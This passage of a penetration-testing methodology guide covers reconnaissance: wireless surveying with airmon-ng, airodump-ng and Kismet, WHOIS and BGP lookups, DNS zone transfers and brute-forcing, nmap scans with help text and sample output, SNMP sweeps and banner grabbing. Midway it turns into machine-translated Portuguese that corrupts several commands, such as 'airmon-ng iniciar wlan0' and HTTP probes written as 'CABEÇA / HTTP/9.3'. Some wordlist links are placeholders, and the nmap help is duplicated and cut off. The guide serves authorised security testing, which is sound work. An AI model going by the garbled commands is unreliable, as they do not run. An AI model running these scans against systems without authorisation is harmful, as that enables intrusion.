A frequency counter is an electronic instrument that is used for measuring the number of oscillations or pulses per second in a repetitive electronic signal. Using a Frequency counter or spectrum analyzer it is possible to identify the transmitting frequencies in use around the target facility. Common frequencies include the following: 

|**Band**|**Frequency Range**|
| :- | :- |
|VHF |150 - 174 MHz |
|UHF |420 - 425 MHz |
|UHF |450 - 470 MHz |
|UHF |851 - 866 MHz |
|VHF |43\.7- 50 MHz |
|UHF |902 - 928 MHz |
|UHF |2400 - 2483.5 MHz |

A spectrum analyzer can be used to visually illustrate the frequencies in use. These are usually targeting specific ranges that are generally more focused than a frequency counter. Below is an output from a spectrum analyzer that can clearly illustrate the frequencies in use. The sweep range for this analyzer is 2399-2485 MHz. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_14.png "Arquivo:Execução de teste de penetração 14.png")

All frequency ranges in use in and around the target should be documented. 
#### **Equipment Identification**
As part of the on-site survey, all radios and antennas in use should be identified. Including radio make and model as well as the length and type of antennas utilized. A few good resources are available to help you identify radio equipment: 

|**Site**|**URL**|**Description**|
| :- | :- | :- |
|HamRadio Outlet |[http://www.hamradio.com](http://www.hamradio.com/)|A great source of information for amateur radios |
|BatLabs |[http://www.batlabs.com](http://www.batlabs.com/)|A great source of information for Motorola two way systems |

Identifying 802.11 equipment is usually much easier to accomplish, if not visually, then via RF emissions. For visual identification, most vendor websites can be searched to identify the specific make and model of the equipment in use. 

|**Manufacturer**|**URL**|
| :- | :- |
|3com |[http://www.3com.com](http://www.3com.com/)|
|Apple |[http://www.apple.com](http://www.apple.com/)|
|Aruba |[http://www.arubanetworks.com](http://www.arubanetworks.com/)|
|Atheros |<http://www.atheros.com/>|
|Belkin |[http://www.belkin.com](http://www.belkin.com/)|
|Bluesocket |<http://www.bluesocket.com/>|
|Buffalo Technology |[http://www.buffalotech.com](http://www.buffalotech.com/)|
|Cisco |[http://www.cisco.com](http://www.cisco.com/)|
|Colubris |<http://www.colubris.com/>|
|D-Link |[http://www.dlink.com](http://www.dlink.com/)|
|Engenius Tech |[http://www.engeniustech.com](http://www.engeniustech.com/)|
|Enterasys |[http://www.enterasys.com](http://www.enterasys.com/)|
|Hewlett Packard |[http://www.hp.com](http://www.hp.com/)|
|Juniper |[http://www.juniper.net](http://www.juniper.net/)|
|Marvell |[http://www.marvell.com](http://www.marvell.com/)|
|Motorola |[http://www.motorola.com](http://www.motorola.com/)|
|Netgear |[http://www.netgear.com](http://www.netgear.com/)|
|Ruckus Wireless |<http://www.ruckuswireless.com/>|
|SMC |[http://www.smc.com](http://www.smc.com/)|
|Trapeze |<http://www.trapezenetworks.com/>|
|TRENDnet |[http://www.trendnet.com](http://www.trendnet.com/)|
|Versa Technology |[http://www.versatek.com](http://www.versatek.com/)|

In a passive manner, it is possible to identify at the manufacturer based upon data collected from RF emissions. 

Wireless Local Area Network (WLAN) discovery consists of enumerating the type of WLAN that is currently deployed. This can be one of the following: Unencrypted WLAN, WEP encrypted WLAN, WPA / WPA2 encrypted WLAN, LEAP encrypted WLAN, or 802.1x WLAN. The tools required to enumerate this information are highlighted as follows. 
##### **Airmon-ng**
Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. It is important to determine if our USB devices are properly detected. For this we can use lsusb, to list the currently detected USB devices. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_15.png "Arquivo:Execução de teste de penetração 15.png")


As the figure illustrates, our distribution has detected not only the Prolific PL2303 Serial Port, where we have our USB GPS connected, but also the Realtek RTL8187 Wireless Adapter. Now that we have determined that our distribution recognizes the installed devices, we need to determine if the wireless adapter is already in monitor mode by running. 

Entering the airmon-ng command without parameters will show the interfaces status. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_16.png "Arquivo:Execução de teste de penetração 16.png")

To use one interface simply use airmon-ng to put your card in monitor mode by running: 

airmon-ng start wlan0

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_17.png "Arquivo:Execução de teste de penetração 17.png")

If there's an existing mon0, destroy it prior to issuing the previous command: 

airmon-ng stop mon0

Once again, entering the airmon-ng command without parameters will show the interfaces status. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_18.png "Arquivo:Execução de teste de penetração 18.png")
##### **Airodump-ng**
Airodump-ng is part of the Aircrack-ng is a network software suite. Specifically, Airodump-ng is a packet sniffer that places air traffic into Packet Capture (PCAP) files or Initialization Vectors (IVS) files and shows information about wireless networks. 

Airodump-ng is used for packet capture of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vectors) for later use with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found APs. Before running Airodump-ng, start the Airmon-ng script to list the detected wireless interfaces. 

Usage: 

airodump-ng <options> <interface> [, <interface>...] 

Opções: 

--ivs : Salva apenas IVs capturados 

--gpsd : Use GPSd 

--write <prefix>: Prefixo do arquivo de despejo 

-w : igual a - -write 

--beacons: registra todos os beacons no arquivo de despejo 

--update <secs>: exibe o atraso de atualização em segundos 

--showack: imprime estatísticas ack/cts/rts 

-h: oculta estações conhecidas para --showack 

-f <msecs> : Tempo em ms entre saltos de canais 

--berlin <secs>: Tempo antes de remover o AP/cliente 

da tela quando nenhum pacote 

for recebido (Padrão: 120 segundos) 

-r <arquivo>: Ler pacotes desse arquivo 

-x < msegs>: Simulação de verificação ativa 

--output-format 

<formatos>: Formato de saída. Valores possíveis: 

pcap, ivs, csv, gps, kismet, netxml 

Formato curto "-o" 

A opção pode ser especificada diversas vezes. Neste caso, cada formato de arquivo especificado será gerado. Apenas ivs ou pcap podem ser usados, não ambos.

Airodump-ng exibirá uma lista de APs detectados e uma lista de clientes conectados ("estações"). 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_19.png "Arquivo:Execução de teste de penetração 19.png")

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_20.png "Arquivo:Execução de teste de penetração 20.png")

A primeira linha mostra o canal atual, o tempo de execução decorrido, a data atual e, opcionalmente, se um handshake WPA/WPA2 foi detectado. 
##### **Kismet-Newcore**
Kismet-newcore é um detector de rede, sniffer de pacotes e sistema de detecção de intrusão para LANs sem fio 802.11. Kismet funcionará com qualquer placa sem fio que suporte o modo de monitoramento bruto e possa detectar tráfego 802.11a, 802.11b, 802.11g e 802.11n. 

Kismet identifica redes coletando passivamente pacotes e detectando redes nomeadas padrão, detectando (e, em determinado momento, descloaking) redes ocultas e inferindo a presença de redes sem beacon por meio do tráfego de dados. 

Kismet é composto por 3 partes: 

- **Drones:** Capturam o tráfego wireless para reportá-lo ao servidor; eles precisam ser iniciados manualmente.
- **Servidor:** Local central que se conecta aos drones e aceita conexões de clientes. Ele também pode capturar tráfego sem fio.
- **Cliente:** A parte GUI que se conectará ao servidor.

O Kismet deve ser configurado para funcionar corretamente. Primeiro, precisamos determinar se ele já está no modo monitor executando: 

airmon-ng

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_21.png "Arquivo:Execução de teste de penetração 21.png")

Para usar uma interface basta usar airmon-ng para colocar sua placa no modo monitor executando: 

airmon-ng iniciar wlan0

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_22.png "Arquivo:Execução de teste de penetração 22.png")

Se houver um mon0 existente, destrua-o antes de emitir o comando anterior: 

airmon-ng parar mon0

Kismet é capaz de usar mais de uma interface como o Airodump-ng. Para usar esse recurso, /etc/kismet/kismet.conf deve ser editado manualmente, pois o airmon-ng não pode configurar mais de uma interface para o kismet. Para cada adaptador, adicione uma linha de origem ao kismet.conf. 

Nota: Por padrão, o kismet armazena seus arquivos de captura no diretório onde foi iniciado. Essas capturas podem ser usadas com Aircrack-ng. 

Digitar “kismet” em um console e pressionar “Enter” iniciará o Kismet. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_23.png "Arquivo:Execução de teste de penetração 23.png")

Conforme descrito anteriormente, o Kismet consiste em três componentes e a tela inicial nos informa que precisamos iniciar o servidor Kismet ou optar por usar um servidor que foi iniciado em outro lugar. Para nossos propósitos. clicaremos em "Sim" para iniciar o servidor Kismet localmente. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_24.png "Arquivo:Execução de teste de penetração 24.png")

Kismet nos apresenta opções de escolha como parte do processo de inicialização do servidor. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_25.png "Arquivo:Execução de teste de penetração 25.png")

A menos que tenhamos configurado uma fonte em /etc/kismet/kismet.conf, precisaremos especificar uma fonte de onde queremos capturar os pacotes. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_26.png "Arquivo:Execução de teste de penetração 26.png")

Conforme mencionado anteriormente, criamos uma subinterface de monitor a partir de nossa interface sem fio. Para nossos propósitos, inseriremos “mon0”, embora sua interface possa ter um nome completamente diferente. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_27.png "Arquivo:Execução de teste de penetração 27.png")


Quando o servidor e o cliente Kismet estão funcionando corretamente, as redes sem fio devem começar a aparecer. Destacamos uma rede habilitada para WEP. Existem inúmeras opções de classificação que você pode escolher. Não cobriremos todas as funcionalidades do Kismet neste momento, mas se você não estiver familiarizado com a interface, você deve brincar com ela até se sentir confortável. 
##### **inSSIDer**
Se você está acostumado a usar o Netstumbler, pode ficar desapontado ao saber que ele não funciona corretamente com o Windows Vista e 7 (64 bits). Dito isto, nem tudo está perdido, pois existe uma alternativa compatível com Windows XP, Vista e 7 (32 e 64 bits). Faz uso da API Wi-Fi nativa e é compatível com a maioria dos dispositivos GPS (NMEA v2.3 e superior). O InSSIDer possui alguns recursos que o tornam a ferramenta preferida se você estiver usando o Windows. O InSSIDer pode rastrear a intensidade do sinal recebido em dBi ao longo do tempo, filtrar pontos de acesso e também exportar dados de Wi-Fi e GPS para um arquivo KML para visualização no Google Earth. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_28.png "Arquivo:Execução de teste de penetração 28.png")
### **Pegada Externa**
A fase de Pegada Externa da Coleta de Inteligência envolve a coleta de resultados de resposta de um alvo com base na interação direta de uma perspectiva externa. O objetivo é reunir o máximo de informações possível sobre o alvo. 
#### **Identificando intervalos de IP**
Para a pegada externa, primeiro precisamos determinar qual dos servidores WHOIS contém as informações que procuramos. Dado que devemos saber o TLD do domínio de destino, basta localizar o Registrador no qual o domínio de destino está registrado. 

As informações WHOIS são baseadas em uma hierarquia em árvore. ICANN (IANA) é o registro oficial para todos os TLDs e é um excelente ponto de partida para todas as consultas manuais de WHOIS. 
##### **Pesquisa WHOIS**
- ICANN - [http://www.icann.org](http://www.icann.org/)
- IANA - [http://www.iana.com](http://www.iana.com/)
- NRO - [http://www.nro.net](http://www.nro.net/)
- AFRINIC - [http://www.afrinic.net](http://www.afrinic.net/)
- APNIC - [http://www.apnic.net](http://www.apnic.net/)
- ARIN - [http://ws.arin.net](http://ws.arin.net/)
- LACNIC - [http://www.lacnic.net](http://www.lacnic.net/)
- RIPE - [http://www.ripe.net](http://www.ripe.net/)

Once the appropriate Registrar was queried we can obtain the Registrant information. There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar. 

- InterNIC - <http://www.internic.net/> [http://www.internic.net](http://www.internic.net/)]
##### **BGP looking glasses**
It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP). Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass. 

- BGP4 - [http](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[://](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[www](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[.](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[bgp](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[4.](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[as](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[/](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[looking](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[-](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)[glasses](http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa=D&sntz=1&usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg)
- BPG6 - <http://lg.he.net/>
#### **Active Reconnaissance**
- Manual browsing
- Google Hacking - <http://www.exploit-db.com/google-dorks>
#### **Passive Reconnaissance**
- Google Hacking - <http://www.exploit-db.com/google-dorks>
#### **Active Footprinting**
The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction. 
##### **Zone Transfers**
DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig, and nmap. 
###### **Host**
host <domain> <DNS server>
###### **Dig**
dig @server domain axfr
##### **Reverse DNS**
Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results. 
##### **DNS Bruting**
After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS. Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure. We will seek to use DNS to reveal additional information about the client. One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer. There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known. 
###### **Fierce2 (Linux)**
For DNS enumeration, there are two tools that are utilized to provide the desired results. The first that we will focus on is named Fierce2. As you can probably guess, this is a modification on Fierce. Fierce2 has lots of options, but the one that we want to focus on attempts to perform a zone transfer. If that is not possible, then it performs DNS queries using various server names in an effort to enumerate the host names that have been registered. 

The command to run *fierce2* is as follows: 

fierce -dns <client domain> -prefix <wordlist>

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_29.png "Arquivo:Execução de teste de penetração 29.png") 

There is a common prefix (called common-tla.txt) wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: 

<https://address-unknown/>
###### **DNSEnum (Linux)**
An alternative to Fierce2 for DNS enumeration is DNSEnum. As you can probably guess, this is very similar to Fierce2. DNSEnum offers the ability to enumerate DNS through brute forcing subdomains, performing reverse lookups, listing domain network ranges, and performing whois queries. It also performs Google scraping for additional names to query. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_30.png "Arquivo:Execução de teste de penetração 30.png") 

The command to run *dnsenum* is as follows:

dnsenum -enum -f <wordlist> <client domain>

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_31.png "Arquivo:Execução de teste de penetração 31.png") 

Again, there is a common prefix wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: 

<https://address-unknown/>
###### **Dnsdict6 (Linux)**
Dnsdict6, which is part of the THC IPv6 Attack Toolkit, is an IPv6 DNS dictionary brute forcer. The options are relatively simple, but simply specify the domain and a dictionary-file. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_32.png "Arquivo:Execução de teste de penetração 32.png")
##### **Port Scanning**
###### **Nmap (Windows/Linux)**
Nmap ("Network Mapper") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. 

Nmap 5.51 ( http://nmap.org )

Usage: nmap [Scan Type(s)] [Options] {target specification}

TARGET SPECIFICATION:

`  `Can pass hostnames, IP addresses, networks, etc.

`  `Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254

`  `-iL <inputfilename>: Input from list of hosts/networks

`  `-iR <num hosts>: Choose random targets

`  `--exclude <host1[,host2][,host3],...>: Exclude hosts/networks

`  `--excludefile <exclude\_file>: Exclude list from file

HOST DISCOVERY:

`  `-sL: List Scan - simply list targets to scan

`  `-sn: Ping Scan - disable port scan

`  `-Pn: Treat all hosts as online -- skip host discovery

`  `-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports

`  `-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes

`  `-PO[protocol list]: IP Protocol Ping

`  `-n/-R: Never do DNS resolution/Always resolve [default: sometimes]

`  `--dns-servers <serv1[,serv2],...>: Specify custom DNS servers

`  `--system-dns: Use OS's DNS resolver

`  `--traceroute: Trace hop path to each host

SCAN TECHNIQUES:

`  `-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans

`  `-sU: UDP Scan

`  `-sN/sF/sX: TCP Null, FIN, and Xmas scans

`  `--scanflags <flags>: Customize TCP scan flags

`  `-sI <zombie host[:probeport]>: Idle scan

`  `-sY/sZ: SCTP INIT/COOKIE-ECHO scans

`  `-sO: IP protocol scan

`  `-b <FTP relay host>: FTP bounce scan

PORT SPECIFICATION AND SCAN ORDER:

`  `-p <port ranges>: Only scan specified ports

`    `Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

`  `-F: Fast mode - Scan fewer ports than the default scan

`  `-r: Scan ports consecutively - don't randomize

`  `--top-ports <number>: Scan <number> most common ports

`  `--port-ratio <ratio>: Scan ports more common than <ratio>

SERVICE/VERSION DETECTION:

`  `-sV: Probe open ports to determine service/version info

`  `--version-intensity <level>: Set from 0 (light) to 9 (try all probes)

`  `--version-light: Limit to most likely probes (intensity 2)

`  `--version-all: Try every single probe (intensity 9)

`  `--version-trace: Show detailed version scan activity (for debugging)

SCRIPT SCAN:

`  `-sC: equivalent to --script=default

`  `--script=<Lua scripts>: <Lua scripts> is a comma separated list of

`           `directories, script-files or script-categories

`  `--script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts

`  `--script-trace: Show all data sent and received

`  `--script-updatedb: Update the script database.

OS DETECTION:

`  `-O: Enable OS detection

`  `--osscan-limit: Limit OS detection to promising targets

`  `--osscan-guess: Guess OS more aggressively

TIMING AND PERFORMANCE:

`  `Options which take <time> are in seconds, or append 'ms' (milliseconds),

`  `'s' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).

`  `-T<0-5>: Set timing template (higher is faster)

`  `--min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes

`  `--min-parallelism/max-parallelism <numprobes>: Probe parallelization

`  `--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies

`      `probe round trip time.

`  `--max-retries <tries>: Caps number of port scan probe retransmissions.

`  `--host-timeout <time>: Give up on target after this long

`  `--scan-delay/--max-scan-delay <time>: Adjust delay between probes

`  `--min-rate <number>: Send packets no slower than <number> per second

`  `--max-rate <number>: Send packets no faster than <number> per second

FIREWALL/IDS EVASION AND SPOOFING:

`  `-f; --mtu <val>: fragment packets (optionally w/given MTU)

`  `-D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys

`  `-S <IP\_Address>: Spoof source address

`  `-e <iface>: Use specified interface

`  `-g/--source-port <portnum>: Use given port number

`  `--data-length <num>: Append random data to sent packets

`  `--ip-options <options>: Send packets with specified ip options

`  `--ttl <val>: Set IP time-to-live field

`  `--spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address

`  `--badsum: Send packets with a bogus TCP/UDP/SCTP checksum

OUTPUT:

`  `-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,

`     `and Grepable format, respectively, to the given filename.

`  `-oA <basename>: Output in the three major formats at once

`  `-v: Increase verbosity level (use -vv or more for greater effect)

`  `-d: Increase debugging level (use -dd or more for greater effect)

`  `--reason: Display the reason a port is in a particular state

`  `--open: Only show open (or possibly open) ports

`  `--packet-trace: Show all packets sent and received

`  `--iflist: Print host interfaces and routes (for debugging)

`  `--log-errors: Log errors/warnings to the normal-format output file

`  `--append-output: Append to rather than clobber specified output files

`  `--resume <filename>: Resume an aborted scan

`  `--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML

`  `--webxml: Reference stylesheet from Nmap.Org for more portable XML

`  `--no-stylesheet: Prevent associating of XSL stylesheet w/XML output

MISC:

`  `-6: Enable IPv6 scanning

`  `-A: Enable OS detection, version detection, script scanning, and traceroute

`  `--datadir <dirname>: Specify custom Nmap data file location

`  `--send-eth/--send-ip: Send using raw ethernet frames or IP packets

`  `--privileged: Assume that the user is fully privileged

`  `--unprivileged: Assume the user lacks raw socket privileges

`  `-V: Print version number

`  `-h: Print this help summary page.

EXAMPLES:

`  `nmap -v -A scanme.nmap.org

`  `nmap -v -sn 192.168.0.0/16 10.0.0.0/8

`  `nmap -v -iR 10000 -Pn -p 80

SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES

Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. 

Based on the IP set being assessed you would want to scan both the TCP and UDP ports across the range 1 to 65535. The command that will be utilized is as follows: 

nmap -A -PN -sU -sS -T2 -v -p 1-65535 <client ip range>/<CIDR> or <Mask> -oA NMap\_FULL\_<client ip range>

nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap\_FULL\_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time

NSE: Loaded 57 scripts for scanning.

Initiating Parallel DNS resolution of 1 host. at 22:27

Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed

Initiating SYN Stealth Scan at 22:27

Scanning client.com (74.117.116.73) [65535 ports]

Discovered open port 80/tcp on 74.117.116.73

On large IP sets, those greater than 100 IP addresses, do not specify a port range. The command that will be utilized is as follows: 

nmap -A -O -PN <client ip range>/<CIDR> or <Mask> -oA NMap\_<client ip range>

nmap -A -O -PN client.com -oA NMap\_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time

Nmap scan report for client.com (74.117.116.73)

Host is up (0.13s latency).

rDNS record for 74.117.116.73: 74-117-116-73.parked.com

Not shown: 999 filtered ports

PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.2.3 ((CentOS))

| http-robots.txt: 2 disallowed entries

|\_/click.php /ud.php

|\_http-title: client.com

|\_http-methods: No Allow or Public header in OPTIONS response (status code 200)

|\_http-favicon: Parked.com domain parking

Warning: OSScan results may be unreliable because we could not find at least 1 o

pen and 1 closed port

Device type: general purpose

Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%)

It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. 

nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time

Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04)

Host is up (1.0s latency).

Not shown: 988 closed ports

PORT      STATE SERVICE

135/tcp   open  msrpc

445/tcp   open  microsoft-ds

554/tcp   open  rtsp

2869/tcp  open  icslap

3389/tcp  open  ms-term-serv

5000/tcp  open  upnp

5001/tcp  open  commplex-link

5002/tcp  open  rfe

5003/tcp  open  filemaker

5004/tcp  open  avt-profile-1

5357/tcp  open  wsdapi

10243/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds
##### **SNMP Sweeps**
SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that "no response" from a probed IP address can mean either of the following: 

- machine unreachable
- SNMP server not running
- invalid community string
- the response datagram has not yet arrived
###### **SNMPEnum (Linux)**
SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_37.png "Arquivo:Execução de teste de penetração 37.png")
##### **SMTP Bounce Back**
A devolução de SMTP, também chamada de Relatório/Recibo de Não Entrega (NDR), uma mensagem de Notificação de Status de Entrega (DSN) (com falha), uma Notificação de Não Entrega (NDN) ou simplesmente uma devolução, é uma mensagem de correio eletrônico automatizada de um sistema de correio informando o remetente de outra mensagem sobre um problema de entrega. Isso pode ser usado para ajudar um invasor a identificar o servidor SMTP, pois as informações do servidor SMTP, incluindo software e versões, podem ser incluídas em uma mensagem devolvida. 
##### **Agarrando banner**
Banner Grabbing é uma técnica de enumeração usada para coletar informações sobre sistemas de computador em uma rede e os serviços que executam suas portas abertas. A captura de banner é usada para identificar na rede a versão dos aplicativos e do sistema operacional que o host de destino está executando. 

A captura de banner geralmente é realizada em Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP) e Simple Mail Transfer Protocol (SMTP); portas 80, 21 e 25, respectivamente. As ferramentas comumente usadas para capturar banners são Telnet, nmap e Netcat. 
###### **HTTP**
LIXO / HTTP/1.0 

CABEÇA / HTTP/9.3 

OPÇÕES / HTTP/1.0 

CABEÇA / HTTP/1.0
### **Pegada Interna**
A fase de Pegada Interna da Coleta de Inteligência envolve a coleta de resultados de resposta de um alvo com base na interação direta de uma perspectiva interna. O objetivo é reunir o máximo de informações possível sobre o alvo. 
#### **Pegada Ativa**
A fase de pegada ativa da Coleta de Inteligência envolve a coleta de resultados de resposta de um alvo com base na interação direta. 
##### **Varreduras de ping**
A pegada ativa começa com a identificação de sistemas ativos. Isso geralmente é realizado realizando uma varredura de Ping para determinar quais hosts respondem. 
###### **Nmap (Windows/Linux)**
Nmap ("Network Mapper") é o padrão de fato para auditoria/varredura de rede. O Nmap roda em Linux e Windows. O Nmap está disponível nas versões de linha de comando e GUI. Para fins deste documento, cobriremos apenas a linha de comando. 

Nmap 5.51 ( http://nmap.org ) 

Uso: nmap [Tipo(s) de varredura] [Opções] {especificação do alvo} ESPECIFICAÇÃO 

`  `DO 

ALVO: 

`  `Pode passar nomes de host, endereços IP, redes, etc. microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 

`  `-iL <inputfilename>: Entrada da lista de hosts/redes 

`  `-iR <num hosts>: Escolha alvos aleatórios 

`  `--exclude <host1[,host2][,host3],...>: Excluir hosts/networks 

`  `--excludefile <exclude\_file>: Excluir lista do arquivo 

HOST DISCOVERY: 

`  `-sL: List Scan - simplesmente lista os alvos a serem verificados 

`  `-sn: Ping Scan - desabilita a varredura de portas 

`  `-Pn: Trata todos os hosts como online - ignora a descoberta de host 

`  `-PS/PA/PU/PY[lista de portas]: descoberta de TCP SYN/ACK, UDP ou SCTP para determinadas portas 

`  `-PE/PP/PM: sondagens de descoberta de solicitação de eco, carimbo de data/hora e máscara de rede 

`  `ICMP -PO[lista de protocolos]: Protocolo IP Ping 

`  `-n/-R: Nunca faça resolução de DNS/Sempre resolva [padrão: às vezes] 

`  `--dns-servers <serv1[,serv2],...>: Especifique servidores DNS personalizados 

`  `--system-dns: Use o resolvedor de DNS do sistema operacional 

`  `--traceroute: Rastreia o caminho do salto para cada host 

TÉCNICAS DE VARREDURA: 

`  `-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon verifica 

`  `-sU: Varredura UDP 

`  `-sN/sF/sX: TCP Varreduras nulas, FIN e de Natal 

`  `--scanflags <flags>: Personalizar sinalizadores de varredura TCP 

`  `-sI <zombie host[:probeport]>: Varredura ociosa 

`  `-sY/sZ: Varreduras SCTP INIT/COOKIE-ECHO 

`  `-sO: Varredura de protocolo IP 

`  `- b <host de retransmissão de FTP>: verificação de devolução de FTP 

ESPECIFICAÇÃO DE PORTA E ORDEM DE VARREDURA: 

`  `-p <intervalos de portas>: verifica apenas portas especificadas 

`    `Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 

`  `-F: Modo rápido - Verifica menos portas do que a verificação padrão 

`  `-r: Verifica portas consecutivamente - não randomize 

`  `--top-ports <número >: Verifica <número> portas mais comuns 

